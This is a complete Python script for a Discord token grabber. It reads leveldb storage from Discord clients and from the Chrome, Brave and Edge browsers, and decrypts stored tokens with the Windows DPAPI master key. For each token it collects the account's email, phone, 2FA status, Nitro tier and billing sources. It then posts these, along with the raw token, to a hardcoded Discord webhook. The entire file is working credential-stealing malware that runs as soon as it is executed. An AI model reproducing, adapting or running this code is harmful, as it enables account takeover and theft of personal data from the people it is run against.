import os, re, json, base64, requests, datetime
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

WEBHOOK_URL = "https://discord.com/api/webhooks/1168113772808900709/jqGmXvPq5r7A4XR8f9Z6uZol6tsUu8N6swozgaU4I5CVHOtizTPWYwDY3c0Vu2_LYbZt"

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(WEBHOOK_URL)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception:
            return None

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            if "cord" in path:
                local_state_path = f"{self.roaming}\\{name.lower()}\\Local State"
                if os.path.exists(local_state_path):
                    master_key = self.get_master_key(local_state_path)
                    for file_name in os.listdir(path):
                        if file_name.endswith(".log") or file_name.endswith(".ldb"):
                            with open(os.path.join(path, file_name), "r", errors="ignore") as f:
                                for line in f.readlines():
                                    for match in re.findall(self.encrypted_regex, line):
                                        encrypted_token = base64.b64decode(match.split("dQw4w9WgXcQ:")[1])
                                        token = self.decrypt_val(encrypted_token, master_key)
                                        if token and token not in self.tokens:
                                            self.tokens.append(token)
            else:
                for file_name in os.listdir(path):
                    if file_name.endswith(".log") or file_name.endswith(".ldb"):
                        with open(os.path.join(path, file_name), "r", errors="ignore") as f:
                            for match in re.findall(self.regex, f.read()):
                                if match not in self.tokens:
                                    self.tokens.append(match)

    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            headers = {
                "Authorization": token,
                "User-Agent": "Mozilla/5.0"
            }
            user = requests.get(self.baseurl, headers=headers).json()
            if "id" not in user:
                continue 

            billing_response = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
            if billing_response.status_code == 200:
                billing = "💳" if billing_response.json() else "❌"
            else:
                billing = "❌"

            username = f"{user['username']}#{user['discriminator']}"
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            email = user.get('email', 'N/A')
            phone = user.get('phone', 'N/A')
            nitro_types = {0: "❌", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
            nitro = nitro_types.get(user.get('premium_type', 0), "❌")
            mfa = "✅" if user.get('mfa_enabled') else "❌"
            parts = token.split('.')
            creation_time = datetime.datetime.fromtimestamp(int.from_bytes(base64.urlsafe_b64decode(token.split('.')[1] + '=='), 'big') + 1293840000, datetime.UTC).strftime('%Y-%m-%d %H:%M:%S')

            val = f"""
<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` 
<:gmail:1051512749538164747> **Email:** `{email}`
:mobile_phone: **Phone:** `{phone}`

🔐 **2FA:** {mfa}
<a:nitroboost:996004213354139658> **Nitro:** {nitro}
<:billing:1051512716549951639> **Billing:** {billing}

<:crown1:1051512697604284416> **Token:** `{token}`
**Creation Time:**  {creation_time}
"""

            embed = {
                "title": username,
                "color": 5639644,
                "fields": [{"name": "Discord Info", "value": val}],
                "thumbnail": {"url": avatar_url},
                "footer": {"text": "dev: H4ndshake"}
            }

            data = {
                "username": "Grabber",
                "avatar_url": "https://cdn.discordapp.com/avatars/1250147435439849586/43e0931ec06dc94fe951173b395d52aa.webp",
                "embeds": [embed]
            }

            requests.post(webhook, json=data)
            self.tokens_sent.append(token)

if __name__ == "__main__":
    Discord()
